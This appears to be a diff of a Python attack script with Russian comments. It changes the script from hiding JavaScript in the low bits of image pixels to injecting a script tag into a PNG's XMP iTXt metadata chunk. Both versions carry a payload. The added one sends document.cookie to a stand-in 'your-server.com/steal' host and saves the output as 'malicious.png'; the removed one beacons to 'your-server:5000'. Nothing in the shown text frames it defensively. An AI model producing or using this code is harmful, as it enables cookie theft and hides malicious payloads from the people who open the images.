@@ -1,46 +1,35 @@
 #!/usr/bin/env python3
-from PIL import Image
-import numpy as np
-import base64
+import struct, zlib, sys
 
-def embed_js_in_image_data(image_path, output_path, js_code):
-    """Embed JS in LSB of image pixels - image looks identical"""
+def png_inject(image_path, output_path, js_code):
+    with open(image_path, 'rb') as f:
+        data = bytearray(f.read())
     
-    img = Image.open(image_path)
-    img = img.convert('RGB')
-    pixels = np.array(img)
+    # Проверка сигнатуры PNG
+    if data[:8] != b'\x89PNG\r\n\x1a\n':
+        raise ValueError("Не PNG файл")
     
-    # Convert JS to binary
-    js_bytes = js_code.encode()
-    js_binary = ''.join(format(byte, '08b') for byte in js_bytes)
+    # Создаем iTXt chunk (UTF-8, сжатый)
+    keyword = b"XML:com.adobe.xmp"
+    text_data = f'<x:xmpmeta><rdf:Description rdf:about=""><script>{js_code}</script></rdf:Description></x:xmpmeta>'.encode('utf-8')
     
-    # Add header for extraction
-    header = "1111111100000000"  # 0xFF00 marker
-    data_binary = header + js_binary + "1111111111111111"  # Footer marker
+    chunk_data = keyword + b'\x00\x00\x00\x00' + text_data
+    chunk_len = struct.pack('>I', len(chunk_data))
+    chunk_type = b'iTXt'
+    crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xffffffff)
     
-    # Flatten pixels
-    flat_pixels = pixels.reshape(-1, 3)
+    new_chunk = chunk_len + chunk_type + chunk_data + crc
     
-    # Embed in LSB of blue channel
-    idx = 0
-    for i in range(len(flat_pixels)):
-        if idx >= len(data_binary):
-            break
-        # Modify LSB of blue channel
-        blue = flat_pixels[i][2]
-        flat_pixels[i][2] = (blue & 0xFE) | int(data_binary[idx])
-        idx += 1
+    # Вставка после IHDR
+    ihdr_end = 8 + 8 + struct.unpack('>I', data[8:12])[0]
+    pos = ihdr_end + 4
+    data[pos:pos] = new_chunk
     
-    # Reshape back
-    new_pixels = flat_pixels.reshape(pixels.shape)
+    with open(output_path, 'wb') as f:
+        f.write(data)
     
-    # Save image
-    img_out = Image.fromarray(new_pixels.astype('uint8'), 'RGB')
-    img_out.save(output_path, 'JPEG', quality=100)
-    
-    print(f"[+] JS hidden in image data: {output_path}")
-    print(f"[+] Embedded {len(js_binary)} bits")
-    return output_path
+    print(f"[+] JS внедрен в {output_path}")
 
-js_payload = "alert('infected'); fetch('http://your-server:5000/beacon');"
-embed_js_in_image_data("original.jpg", "stego_image.jpg", js_payload)
+if __name__ == "__main__":
+    js = "alert('Malicious PNG'); fetch('https://your-server.com/steal?cookie='+document.cookie)"
+    png_inject("clean.png", "malicious.png", js)
